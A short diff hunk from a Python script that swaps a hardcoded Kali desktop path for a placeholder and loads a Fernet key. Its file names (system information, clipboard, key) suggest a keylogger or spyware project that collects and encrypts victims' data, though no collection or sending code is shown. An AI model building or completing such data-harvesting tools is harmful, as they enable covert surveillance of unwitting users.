@@ -7,7 +7,7 @@ system_information = "system-info.txt"
 clipboard_information = "clipboard.txt"
 Cryptokey = "KEY.txt"
 
-filepath = "//home//kali//Desktop//WW mk1//"
+filepath = "Enter your Downloaded files path here with //"
 with open(filepath+Cryptokey,'rb') as f:
     key=f.read()
     fernet=Fernet(key)
